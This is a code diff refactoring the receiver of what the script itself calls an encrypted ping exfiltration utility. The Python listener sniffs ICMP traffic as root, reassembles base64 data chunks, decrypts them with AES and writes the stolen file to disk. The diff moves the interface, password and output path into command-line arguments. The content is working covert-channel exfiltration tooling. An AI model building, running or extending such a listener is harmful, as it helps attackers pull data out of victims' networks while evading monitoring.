@@ -8,19 +8,14 @@ from base64 import b64decode
 from hashlib import sha256
 from Cryptodome.Cipher import AES
 from Cryptodome.Util.Padding import unpad
+import argparse
 
-INTERFACE = 'eth0'
-MAX_SIZE = 256
 HANDSHAKE_MSG = b"wei wei"
 DATA_SIZE_LEN = 4
-OUT_FILENAME = 'data_out.txt'
-PASSWORD = "caccole"
 
 # GLOBAL SHIT
 session_id = -1
 initial_seq_n = -1
-key = ''
-iv = ''
 data_len = -1
 received_data_n = 0
 received_data = dict()
@@ -34,8 +29,6 @@ def process_icmp_packet(packet):
     global session_id
     global initial_seq_n
     global seq_n
-    global key
-    global iv
     global data_len
     global received_data_n
 
@@ -95,21 +88,30 @@ def decrypt(cypher, password):
     return unpadded
 
 
-def threaded_sniff():
-    sniff(iface=INTERFACE, prn=process_icmp_packet)           
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="an encrypted ping exfiltration utility",prog="pingthefuckoutReceiver",)
+    parser.add_argument("-o","--out",type=str,dest="out_file",required=True,help="output file",)
+    parser.add_argument("-i","--interface",type=str,dest="interface",default="eth0",help="interface",)
+    parser.add_argument("-p","--password",type=str,dest="password",default="",help="password used for encryption" )
+    return parser.parse_args()
+
+
+def threaded_sniff(interface):
+    sniff(iface=interface, prn=process_icmp_packet)           
 
 
 if __name__ == "__main__":
     if getuid() != 0:
         print("Please run as root user")
         exit(1)
-    print("Server is running on interface: %s ..." % INTERFACE)
 
     from threading import Thread 
 
-    sniffer = Thread(target = threaded_sniff)
+    args = parse_arguments()
+    sniffer = Thread(target=threaded_sniff, args=(args.interface,))
     sniffer.daemon = True
     sniffer.start()
+    print("Server is running on interface: %s ..." % args.interface)
 
     while True:
         sleep(1)
@@ -118,9 +120,9 @@ if __name__ == "__main__":
             print("All data chunks were received ...")
             reassembled_b64 = reassemble_b64(received_data)
             encrypted_content = b64_decode(reassembled_b64)
-            file_content = decrypt(encrypted_content, PASSWORD)
-            print(file_content)
-            with open(OUT_FILENAME, 'wb') as f:
+            file_content = decrypt(encrypted_content, args.password)
+            #print(file_content)
+            with open(args.out_file, 'wb') as f:
                 f.write(file_content)
             break
     
